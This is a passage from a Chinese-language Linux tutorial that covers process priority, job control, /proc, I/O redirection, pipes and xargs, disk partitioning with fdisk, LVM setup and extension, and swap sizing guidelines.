<h3 id="4-进程优先级nice"><a href="#4-进程优先级nice" class="headerlink" title="4.进程优先级nice"></a>4.进程优先级nice</h3><p>Linux 进程调度及多任务，每个CPU在一个时间点上只能处理一个进程，通过时间片技术，来同时运行多个程序。系统中的两种优先级，在top中显示的优先级有两个，PR值和nice值</p>
<table>
<thead>
<tr>
<th align="center">优先级名称</th>
<th align="center">范围</th>
<th align="center">特  性</th>
</tr>
</thead>
<tbody><tr>
<td align="center">PR</td>
<td align="center">0~39</td>
<td align="center">将nice级别显示为映射到更大优先级队列</td>
</tr>
<tr>
<td align="center">nice</td>
<td align="center">-20~19</td>
<td align="center">NI：实际nice值。值越高：表示优先级越低，如+19<br>值越低：表示优先级越高，如-20</td>
</tr>
</tbody></table>
<ul>
<li>查看进程的nice级别    </li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ps axo pid,command,nice,cls --sort=-nice</span><br><span class="line">		cls表示显示策略列。</span><br><span class="line">		TS 表示该进程使用的调度策略为SCHED_OTHER</span><br><span class="line">		FF表示高级进程first in  first out</span><br></pre></td></tr></table></figure>

<ul>
<li><p>启动具有不同nice级别的进程</p>
<p>默认情况：启动进程时，通常会继承父进程的 nice级别，默认为0            </p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#手动启动不同nice，观察两个程序的不同nice值</span></span></span><br><span class="line">[root@localhost ~]# nice -n -5 sleep 6000 &amp;</span><br><span class="line">[1] 2220</span><br><span class="line">[root@localhost ~]# nice -n -10 sleep 7000 &amp;</span><br><span class="line">[2] 2229</span><br><span class="line">[root@localhost ~]# ps axo command,pid,nice | grep sleep</span><br><span class="line">sleep 6000                    2220  -5</span><br><span class="line">sleep 7000                    2229 -10</span><br><span class="line">grep --color=auto sleep       2233   0</span><br></pre></td></tr></table></figure>

<ul>
<li>更改现有进程的nice级别</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#使用shell更改nice级别</span></span></span><br><span class="line">1.创建一个睡眠示例程序</span><br><span class="line">[root@localhost ~]# sleep 7000 &amp;</span><br><span class="line">[2] 2669</span><br><span class="line"></span><br><span class="line">2.修改他的nice值</span><br><span class="line">[root@localhost ~]# renice -20 2669</span><br><span class="line">2669 (进程 ID) 旧优先级为 0，新优先级为 -20，观察修旧的nice值。</span><br></pre></td></tr></table></figure>

<h3 id="5-作业控制-jobs-了解"><a href="#5-作业控制-jobs-了解" class="headerlink" title="5.作业控制 jobs(了解)"></a>5.作业控制 jobs(了解)</h3><p>作业控制是一个命令行功能，也叫后台运行。</p>
<p>foreground：前台进程，是在终端中运行的命令，占领终端。</p>
<p>background：后台进程，没有控制终端，它不需要终端的交互。看不见，但是在运行。</p>
<p><strong>后台程序控制示例</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1.观察占领前台的现象。运行一个程序，当前终端无法输入。大部分命令行输入已经无效。</span></span><br><span class="line">[root@qianfeng ~]# sleep 2000</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2.运行后台程序</span></span><br><span class="line">[root@qianfeng ~]# sleep 3000 &amp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3.ps查询所有程序</span></span><br><span class="line">[root@qianfeng ~]# ps aux |grep sleep</span><br><span class="line">root 8895 0.0 0.0 100900 556 pts/0 S 12:13 0:00 sleep 3000</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 4.jobs查看后台进程</span></span><br><span class="line">[root@qianfeng ~]# jobs</span><br><span class="line">[1]- Running sleep 3000 &amp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 5.调动后台程序至前台</span></span><br><span class="line">[root@qianfeng ~]# fg  1 //将作业1调回到前台</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 6.消灭后台进程</span></span><br><span class="line">[root@qianfeng ~]# kill  %1</span><br></pre></td></tr></table></figure>

<p>注意</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">“kill 1”   和   “kill   %1”  不同，</span><br><span class="line">前者终止PID为1的进程，</span><br><span class="line">后者杀死作业序号为1的后台程序</span><br></pre></td></tr></table></figure>

<h3 id="6-虚拟文件系统-proc-（了解）"><a href="#6-虚拟文件系统-proc-（了解）" class="headerlink" title="6.虚拟文件系统 proc （了解）"></a>6.虚拟文件系统 proc （了解）</h3><p>虚拟文件系统：采集服务器自身 内核、进程运行的状态信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/proc/cpuinfo     //CPU</span><br><span class="line">[root@qianfeng ~]# cat   /proc/cpuinfo</span><br><span class="line"></span><br><span class="line">/proc/meminfo    //内存</span><br><span class="line">[root@qianfeng ~]# less /proc/meminfo</span><br><span class="line"></span><br><span class="line">/proc/cmdline    //内核</span><br><span class="line">[root@qianfeng ~]# cat /proc/cmdline</span><br></pre></td></tr></table></figure>



<h1 id="⑤Linux重定向管道"><a href="#⑤Linux重定向管道" class="headerlink" title="⑤Linux重定向管道"></a>⑤Linux重定向管道</h1><h2 id="一、重定向"><a href="#一、重定向" class="headerlink" title="一、重定向"></a>一、重定向</h2><h3 id="1-标准输入、标准输出、标准错误"><a href="#1-标准输入、标准输出、标准错误" class="headerlink" title="1.标准输入、标准输出、标准错误"></a>1.标准输入、标准输出、标准错误</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FD，file descriptors，文件描述符</span><br><span class="line">进程使用文件描述符来管理打开的文件</span><br><span class="line"></span><br><span class="line">FD是访问文件的标识，即链接文件</span><br><span class="line">	0是键盘只读，</span><br><span class="line">	1,2是终端可以理解是屏幕，</span><br><span class="line">	3+是文件，可读可写</span><br></pre></td></tr></table></figure>

<p>示例<br>    通过VIM程序，来观察一个进程的FD信息。<br>    1.通过一个终端，打开一个文本。<br>        vim 1.txt<br>    2.通过另一个终端，查询文本程序的进程号<br>        ps  aux| grep vim<br>    3.在/proc目录中查看文本程序的FD<br>        通常在 /proc/PID/fd  就能看到文件的FD调用情况。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ls /proc/5606/fd</span><br><span class="line">			感觉好像没什么。用用ls -l呢？</span><br><span class="line">[root@localhost ~]# ll /proc/5606/fd</span><br><span class="line">		总用量 0</span><br><span class="line">lrwx------. 1 root root 64 10月 10 07:37 0 -&gt; /dev/pts/2   ##标准输入</span><br><span class="line">lrwx------. 1 root root 64 10月 10 07:37 1 -&gt; /dev/pts/2   ##标准输出</span><br><span class="line">lrwx------. 1 root root 64 10月 10 07:37 2 -&gt; /dev/pts/2   ##标准错误输出</span><br><span class="line">lrwx------. 1 root root 64 10月 10 07:37 3 -&gt; /root/.1.txt.swp   ##常规文件</span><br></pre></td></tr></table></figure>

<h3 id="2-重定向案例-gt-lt"><a href="#2-重定向案例-gt-lt" class="headerlink" title="2.重定向案例 &gt;_&lt;"></a>2.重定向案例 &gt;_&lt;</h3><table>
<thead>
<tr>
<th align="center">输出重定向</th>
<th align="center">符   号</th>
</tr>
</thead>
<tbody><tr>
<td align="center">正确输出</td>
<td align="center">1&gt;等价于 &gt;                1&gt;&gt; 等价于&gt;&gt;</td>
</tr>
<tr>
<td align="center">错误输出</td>
<td align="center">2&gt;（无简写）          2&gt;&gt;（无简写）</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">案例1，输出重定向</span><br><span class="line">[root@qianfeng ~]# date 1&gt; date.txt </span><br><span class="line">[root@qianfeng ~]# date &gt;&gt; date.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">案例2：错误输出重定向</span><br><span class="line">	​错误示范</span><br><span class="line">[root@qianfeng ~]# ls /home/    2&gt;    list.txt </span><br><span class="line">//观察list.txt文件中有没有内容？因为没有错误信息</span><br><span class="line">	​正确示范</span><br><span class="line">[root@qianfeng ~]# ls  /aaaaaaaaa 2&gt;  list.txt </span><br><span class="line">[root@qianfeng ~]# cat  list.txt </span><br><span class="line">ls: 无法访问/aaaaaaaaa: 没有那个文件或目录</span><br><span class="line">//当某条命令产生错误时，才会有错误输出</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">案例3： 正确和错误都输入到相同位置</span><br><span class="line">[root@qianfeng ~]# ls /home/ /aaaaaaaaa &amp;&gt;list.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">生产环境常用，将输出丢弃</span></span><br><span class="line">[root@qianfeng ~]#yum  install   httpd  &amp;&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h3 id="3-输入重定向"><a href="#3-输入重定向" class="headerlink" title="3.输入重定向"></a>3.输入重定向</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">标准输入： &lt; 等价 0&lt;</span><br><span class="line"></span><br><span class="line">案例：利用现成的邮件内容快速输入，发送邮件</span><br><span class="line">[root@qianfeng ~]# mail -s "test01" alice &lt;  word.txt</span><br><span class="line">原理：利用输入重定向，把文件内容代替人为的输入</span><br></pre></td></tr></table></figure>

<h2 id="二、管道"><a href="#二、管道" class="headerlink" title="二、管道"></a>二、管道</h2><h3 id="1-管道"><a href="#1-管道" class="headerlink" title="1.管道  |"></a>1.管道  |</h3><ul>
<li><p><strong>进程管道 Piping</strong></p>
<img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200715211050195.png" alt="image-20200715211050195" style="zoom: 80%;">

</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 简介</span></span></span><br><span class="line">    管道命令可以将多条命令组合起来，一次性完成复杂的处理任务</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 语法</span></span></span><br><span class="line">    command1 | command2 |command3 |...</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 案例</span></span></span><br><span class="line">[root@qianfeng ~]# cat   /etc/passwd   |   tail -3</span><br><span class="line">[root@qianfeng ~]# ps aux       |      grep 'sshd'</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>tee管道</strong></p>
<img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200715211305876.png" alt="image-20200715211305876" style="zoom: 67%;">

</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 简介</span></span></span><br><span class="line">    三通管道，即交给另一个程序处理。又保存一份副本</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 案例</span></span></span><br><span class="line">[root@localhost ~]# cat /etc/passwd |tee 88.txt | tail -1</span><br><span class="line">qianfeng:x:1001:1001::/home/qianfeng:/bin/bash</span><br><span class="line">[root@localhost ~]# cat 888.txt</span><br><span class="line"></span><br><span class="line">888.txt文本中是什么内容呢？一行还是所有行？	</span><br><span class="line">答：所有行内容，因为和传送过去的时候，还没有进行tail的处理</span><br></pre></td></tr></table></figure>

<h3 id="2-参数传递-Xargs"><a href="#2-参数传递-Xargs" class="headerlink" title="2.参数传递 Xargs"></a>2.参数传递 Xargs</h3><p> 针对cp、rm等一些特殊命令使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1 环境准备，准备一些文件。</span><br><span class="line">[root@localhost ~]# touch /home/file&#123;1..5&#125;</span><br><span class="line">[root@localhost ~]#ls   /home</span><br><span class="line"></span><br><span class="line">2 接到消息，部分文件需要删除。</span><br><span class="line">[root@localhost ~]# vim files.txt </span><br><span class="line">/home/file1</span><br><span class="line">/home/file3</span><br><span class="line">/home/file5</span><br><span class="line"></span><br><span class="line">3 使用管道</span><br><span class="line">[root@localhost ~]# cat files.txt |rm -rvf</span><br><span class="line">		失败</span><br><span class="line"></span><br><span class="line">4.貌似之前的不行。下面加上xargs</span><br><span class="line">[root@localhost ~]# cat files.txt |xargs rm -rvf </span><br><span class="line">removed ‘/home/file1’</span><br><span class="line">removed ‘/home/file3’</span><br><span class="line">removed ‘/home/file5’</span><br><span class="line">[root@localhost ~]#ls   /home</span><br><span class="line">通过|xargs成功连接rm命令</span><br></pre></td></tr></table></figure>

<h1 id="⑥Linux存储管理1"><a href="#⑥Linux存储管理1" class="headerlink" title="⑥Linux存储管理1"></a>⑥Linux存储管理1</h1><h2 id="一、基本分区"><a href="#一、基本分区" class="headerlink" title="一、基本分区"></a>一、基本分区</h2><p>磁盘图示</p>
<img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200715214644116.png" alt="image-20200715214644116" style="zoom:80%;">

<table>
<thead>
<tr>
<th align="center">磁盘介绍</th>
<th align="center">释  义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">名称</td>
<td align="center">磁盘/硬盘/disk，是同一个东西，不同于内存的是容量比较大</td>
</tr>
<tr>
<td align="center">类型</td>
<td align="center">从工作原理区分，2类：<br>1.机械硬盘，即普通硬盘，主要由：盘片，磁头，盘片转轴及控制电机，<br>磁头控制器，数据转换器，接口，缓存等几个部分组成<br>2.固态硬盘，固态驱动器（简称SSD），是用固态电子存储芯片阵列而制成的硬盘</td>
</tr>
<tr>
<td align="center">尺寸</td>
<td align="center">3.5、2.5、1.8英寸</td>
</tr>
<tr>
<td align="center">接口</td>
<td align="center">早期IDE —— 现在SATA I、II、III</td>
</tr>
<tr>
<td align="center">转速</td>
<td align="center">5400、7200、10000、15000 rpm</td>
</tr>
<tr>
<td align="center">厂商</td>
<td align="center">西部数据、希捷、三星、日立、金士顿</td>
</tr>
<tr>
<td align="center">命名</td>
<td align="center">kernel对不同接口硬盘命名方式，RHEL7/centos7：<br>IDE（并口）—-/dev/hda、/dev/hdb<br>SATA（串口）—-/dev/sda、/dev/sdb<br>/dev设备文件目录，sda是一个文件，s代表sata就是串口，d代表磁盘，a第一块<br></td>
</tr>
</tbody></table>
<p><strong>磁盘分区方式：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1、MBR</span></span><br><span class="line">主引导记录，是位于磁盘最前边的一段引导，支持最大的磁盘容量是 &lt;2TB。设计时分配4个分区。如果希望超过4个分区，需放弃主分区，改为扩展分区和逻辑分区。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2、GPT</span></span><br><span class="line">全局唯一标识分区表，是一个实体硬盘的分区表的结构布局的标准。GPT 支持大于2T的硬盘，支持128个分区</span><br></pre></td></tr></table></figure>

<p><strong>术语：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">盘片：</span></span><br><span class="line">一块硬盘有若干盘片，每个盘片有可以存储数据的上、下两盘面（Side）。这些盘面堆叠在主轴上高速旋转，它们从上至下从“0”开始依次编号。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">柱面：</span></span><br><span class="line">所有盘面上的同一磁道构成一个圆柱，称作柱面</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">扇区：</span></span><br><span class="line">将一个盘面划分为若干内角相同的扇形，这样盘面上的每个磁道就被分为若干段圆弧，每段圆弧叫做一个扇区。每个扇区中的数据作为一个单元同时读出或写入。硬盘的第一个扇区，叫做引导扇区。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">磁道：</span></span><br><span class="line">每个盘面被划分成许多同心圆，这些同心圆轨迹叫做磁道；磁道从外向内从0开始顺序编号</span><br></pre></td></tr></table></figure>

<h2 id="二、管理磁盘"><a href="#二、管理磁盘" class="headerlink" title="二、管理磁盘"></a>二、管理磁盘</h2><p>VMware增加磁盘：1编辑虚拟机设置—-2添加—-3硬盘—-4下一步</p>
<p>管理新磁盘流程三部曲：分区(MBR或者GPT) —-&gt;格式化/文件系统 Filesystem —-&gt; 挂载mount</p>
<h3 id="1-查看磁盘信息"><a href="#1-查看磁盘信息" class="headerlink" title="1.查看磁盘信息"></a>1.查看磁盘信息</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">方法一：</span><br><span class="line">[root@localhost ~]# ll /dev/sd*</span><br><span class="line">brw-rw----. 1 root disk 8,  0 1月  25 09:35 /dev/sda</span><br><span class="line">brw-rw----. 1 root disk 8,  1 1月  25 09:35 /dev/sda1</span><br><span class="line">brw-rw----. 1 root disk 8,  2 1月  25 09:35 /dev/sda2</span><br><span class="line">brw-rw----. 1 root disk 8, 16 1月  25 09:35 /dev/sdb</span><br><span class="line">brw-rw----. 1 root disk 8, 32 1月  25 09:35 /dev/sdc</span><br><span class="line">brw-rw----. 1 root disk 8, 48 1月  25 09:35 /dev/sdd</span><br><span class="line"><span class="meta">#</span><span class="bash">注释：/dev/sdb、/dev/sdc、/dev/sdc相当于购买的新磁盘</span></span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">[root@localhost ~]# lsblk</span><br></pre></td></tr></table></figure>

<h3 id="2-创建分区（MBR方式）"><a href="#2-创建分区（MBR方式）" class="headerlink" title="2.创建分区（MBR方式）"></a>2.创建分区（MBR方式）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">启动分区工具</span></span><br><span class="line">[root@localhost ~]# fdisk  /dev/sdb</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">进入会话模式</span></span><br><span class="line">[root@localhost ~]# fdisk /dev/sdb</span><br><span class="line">欢迎使用 fdisk (util-linux 2.23.2)。</span><br><span class="line"></span><br><span class="line">更改将停留在内存中，直到您决定将更改写入磁盘。</span><br><span class="line">使用写入命令前请三思。</span><br><span class="line"></span><br><span class="line">Device does not contain a recognized partition table</span><br><span class="line">使用磁盘标识符 0xd43058cb 创建新的 DOS 磁盘标签。</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)： n</span><br><span class="line">欢迎界面，输入帮助指令或操作指令。</span><br><span class="line">				</span><br><span class="line">命令(输入 m 获取帮助)：n</span><br><span class="line">Partition type:</span><br><span class="line">   p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">   e   extended</span><br><span class="line">   </span><br><span class="line">Select (default p):  p  #请选择主分区，或扩展分区</span><br><span class="line"></span><br><span class="line">分区号 (1-4，默认 1)： 1</span><br><span class="line"></span><br><span class="line">起始 扇区 (2048-10485759，默认为 2048)： 敲击回车键      #选择磁盘开始的扇区</span><br><span class="line">将使用默认值 2048</span><br><span class="line"></span><br><span class="line">Last 扇区, +扇区 or +size&#123;K,M,G&#125; (2048-10485759，默认为 10485759)： +2G</span><br><span class="line">	说明</span><br><span class="line">		选择磁盘分区结束的扇区，即分区大小</span><br><span class="line">		输入分区大小“+2G” 后回车</span><br><span class="line">		实际环境根据磁盘划分，如4T磁盘，可以500G 一个分区</span><br><span class="line">分区 1 已设置为 Linux 类型，大小设为 2 GiB</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)： w </span><br><span class="line"><span class="meta">#</span><span class="bash">已经完成 2G 大小分区记录。但未生效。输入w保存分区信息,自动退出分区工具</span></span><br><span class="line">The partition table has been altered!</span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line">正在同步磁盘。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">刷新分区表</span><br><span class="line">	[root@localhost ~]#  partprobe /dev/sdb  </span><br><span class="line">查看分区结果</span><br><span class="line">	[root@localhost ~]# fdisk -l /dev/sdb  或 lsblk</span><br><span class="line">划分磁盘完毕，/dev/sdb1</span><br></pre></td></tr></table></figure>

<h3 id="3-创建文件系统"><a href="#3-创建文件系统" class="headerlink" title="3.创建文件系统"></a>3.创建文件系统</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# mkfs.ext4    /dev/sdb1</span><br><span class="line">下面是一堆输出提示...</span><br><span class="line"></span><br><span class="line">新创建的分区，sdb2，sdb3 都要格式化</span><br></pre></td></tr></table></figure>

<h3 id="4-挂载mount"><a href="#4-挂载mount" class="headerlink" title="4.挂载mount"></a>4.挂载mount</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">手动挂载</span><br><span class="line">创建挂载点，一个分区一个挂载点</span><br><span class="line">[root@localhost ~]# mkdir /mnt/disk1</span><br><span class="line">[root@localhost ~]#mount -t ext4  /dev/sdb1 /mnt/disk1</span><br></pre></td></tr></table></figure>

<h3 id="5-查看挂载信息"><a href="#5-查看挂载信息" class="headerlink" title="5.查看挂载信息"></a>5.查看挂载信息</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#方法1 df -hT</span></span></span><br><span class="line">[root@server0 ~]# df -Th</span><br><span class="line">Filesystem Type Size Used Avail Use% Mounted on</span><br><span class="line"></span><br><span class="line">/dev/sdb1  ext4     2G    6M   1.9G   3%  /mnt/disk1</span><br><span class="line"></span><br><span class="line"> 分区      文件系统  大小  占用   空闲  占比  挂载点</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#方法2 mount</span></span></span><br><span class="line">[root@server0 ~]# mount</span><br><span class="line">/dev/sdb1 on /mysql_data type xfs </span><br><span class="line">(rw,relatime,seclabel,attr2,inode64,noquoa)</span><br><span class="line">/dev/sdb3 on /mnt/disk1/disk2/disk3/disk4 type ext4 </span><br><span class="line">(rw,relatime,seclabel,dta=ordered)</span><br><span class="line"></span><br><span class="line">mount 看的是磁盘有没有特殊属性</span><br></pre></td></tr></table></figure>

<h2 id="三、逻辑卷LVM"><a href="#三、逻辑卷LVM" class="headerlink" title="三、逻辑卷LVM"></a>三、逻辑卷LVM</h2><p>目的：管理磁盘的一种方式，性质与基本磁盘无异</p>
<p>特点：随意扩张大小</p>
<p>PV:物理卷（Physical volume）</p>
<p>VG：卷组(Volume Group)</p>
<p>LV：逻辑卷(Logical Volume)</p>
<h3 id="1-创建LVM"><a href="#1-创建LVM" class="headerlink" title="1.创建LVM"></a>1.创建LVM</h3><p>1.准备物理磁盘</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@server0 ~]# ll /dev/sd*</span><br><span class="line">brw-rw----. 1 root disk 253, 32 Jun 6 17:38 /dev/sdc</span><br><span class="line">brw-rw----. 1 root disk 253, 48 Jun 6 17:38 /dev/sdd</span><br><span class="line">brw-rw----. 1 root disk 253, 64 Jun 6 17:38 /dev/sde</span><br></pre></td></tr></table></figure>

<p>2.将物理磁盘，转换成物理卷-PV</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@server0 ~]# pvcreate /dev/sdc</span><br><span class="line">Physical volume "/dev/sdc" successfully created</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">查看PV信息			</span></span><br><span class="line">[root@server0 ~]# pvscan </span><br><span class="line">PV /dev/vdd lvm2 [2.00 GiB]</span><br><span class="line">Total: 1 [2.00 GiB] / in use: 0 [0 ] / in no VG: 1 [2.00 GiB]</span><br><span class="line"></span><br><span class="line">[root@server0 ~]# pvs</span><br><span class="line">PV VG Fmt Attr PSize PFree</span><br><span class="line">/dev/vdd lvm2 a-- 2.00g 2.00g</span><br><span class="line"></span><br><span class="line">[root@server0 ~]# pvdisplay</span><br></pre></td></tr></table></figure>

<p>3.创建卷组-VG</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@server0 ~]# vgcreate vg1 /dev/sdc</span><br><span class="line">Volume group "vg1" successfully created</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">查看卷组信息</span></span><br><span class="line">第一种方法，查看卷组的摘要信息。卷组名，物理卷数量，逻辑卷数量，大小等。</span><br><span class="line">[root@server0 ~]# vgs</span><br><span class="line">VG #PV #LV #SN Attr VSize VFree</span><br><span class="line">vg1 1 0 0 wz--n- 2.00g 2.00g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第二种方法，扫描卷组信息。</span><br><span class="line">[root@server0 ~]# vgscan </span><br><span class="line">Reading all physical volumes. This may take a while...</span><br><span class="line">Found volume group "vg1" using metadata type lvm2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第三种方法。显示卷组详细信息。</span><br><span class="line">[root@server0 ~]# vgdisplay </span><br><span class="line">--- Volume group ---</span><br><span class="line">...</span><br><span class="line">VG Size 2.00 GiB					//重点观察</span><br><span class="line">PE Size 4.00 MiB					//重点观察</span><br><span class="line">Total PE 511						//重点观察</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>4.创建逻辑卷LV</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@server0 ~]# lvcreate -L 200M -n lv1 vg1</span><br><span class="line"></span><br><span class="line">指定大小，单位M，G</span><br><span class="line">创建逻辑卷  -L大小  -n卷名   vg1组名</span><br><span class="line">查看LV</span><br><span class="line">				</span><br><span class="line">[root@server0 ~]# lvscan </span><br><span class="line">ACTIVE '/dev/vg1/lv1' [400.00 MiB] inherit</span><br><span class="line">ACTIVE '/dev/vg1/lv2' [200.00 MiB] inherit</span><br></pre></td></tr></table></figure>

<p>5.创建文件系统并挂载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@server0 ~]# mkfs.ext4 /dev/vg1/lv1</span><br><span class="line">注意：/dev/卷组名/逻辑卷名</span><br></pre></td></tr></table></figure>

<p>6.创建挂载点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@server0 ~]# mkdir  /mnt/lv1</span><br></pre></td></tr></table></figure>

<p>7.挂载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@server0 ~]#mount  /dev/vg1/lv1   /mnt/lv1</span><br><span class="line"></span><br><span class="line">查看挂载结果</span><br><span class="line">[root@server0 ~]# df</span><br></pre></td></tr></table></figure>

<h3 id="2-VG管理"><a href="#2-VG管理" class="headerlink" title="2.VG管理"></a>2.VG管理</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#扩大VG vgextend</span></span></span><br><span class="line"></span><br><span class="line">环境：/dev/vg1 容量由5G 扩容到 10G。</span><br><span class="line">步骤1，创建PV。而后使用第二步，将PV增加到VG中。</span><br><span class="line">[root@server0 ~]# pvcreate /dev/sdd1</span><br><span class="line"></span><br><span class="line">步骤2：扩展VG，同时包含方法1.</span><br><span class="line">[root@server0 ~]# vgextend vg1 /dev/sdd1</span><br><span class="line">Volume group "vg1" successfully extended</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#查看VG</span></span></span><br><span class="line">[root@server0 ~]# vgs</span><br><span class="line">VG #PV #LV #SN Attr VSize VFree</span><br><span class="line">vg1 2 2 0 wz--n- 3.99g 3.76g</span><br></pre></td></tr></table></figure>

<h3 id="3-LV扩容"><a href="#3-LV扩容" class="headerlink" title="3.LV扩容"></a>3.LV扩容</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">####  1. LV扩容</span></span></span><br><span class="line"></span><br><span class="line">1.查看VG空间。观察VG是否有剩余空间</span><br><span class="line">[root@server0 ~]# vgs</span><br><span class="line">VG #PV #LV #SN Attr VSize VFree</span><br><span class="line">vg1 2 1 0 wz--n- 9.99g 5.99g</span><br><span class="line"></span><br><span class="line">2.扩容LV</span><br><span class="line">[root@server0 ~]# lvextend -L +200M /dev/vg1/lv1</span><br><span class="line">增加200M空间，给lv2</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 2. FS扩容 </span></span></span><br><span class="line"></span><br><span class="line">先观察文件系统当前容量。</span><br><span class="line">[root@server0 ~]# df -Th </span><br><span class="line">/dev/mapper/vg1-lv2 ext4 240M 32M 192M 15% /mnt/lv2</span><br><span class="line"></span><br><span class="line">[root@server0 ~]# resize2fs /dev/vg1/lv1</span><br><span class="line">再次观察df -hT 的分区大小。和上一次的对比一下。大小已经发生改变。</span><br><span class="line"></span><br><span class="line">查看FS					</span><br><span class="line">[root@server0 ~]# df -Th</span><br><span class="line">Filesystem Type Size Used Avail Use% Mounted on</span><br><span class="line">/dev/mapper/vg1-lv1 xfs 765M 67M 698M 9% /mnt/lv1</span><br><span class="line">/dev/mapper/vg1-lv2 ext4 488M 32M 429M 7% /mnt/lv2</span><br><span class="line">请注意对比，之前的输出结果，文件系统的大小发生改变</span><br></pre></td></tr></table></figure>

<h2 id="四、交换分区管理-Swap"><a href="#四、交换分区管理-Swap" class="headerlink" title="四、交换分区管理 Swap"></a>四、交换分区管理 Swap</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><p>​    作用： ”提升“ 内存的容量，防止OOM（Out Of Memory）</p>
<p>​    <strong>swap大小</strong>  swapon  设备名   打开、关闭</p>
<table>
<thead>
<tr>
<th align="center">生产中：系统内存</th>
<th align="center">swap大小</th>
</tr>
</thead>
<tbody><tr>
<td align="center">小于等于4GB</td>
<td align="center">推荐设置为内存的2倍</td>
</tr>
<tr>
<td align="center">4~16GB</td>
<td align="center">最小需要 4GB 交换空间</td>
</tr>
<tr>
<td align="center">16~64GB</td>
<td align="center">最小需要 8GB 交换空间</td>
</tr>
<tr>
<td align="center">64~256GB</td>
<td align="center">最小需要 16GB 交换空间</td>
</tr>
</tbody></table>
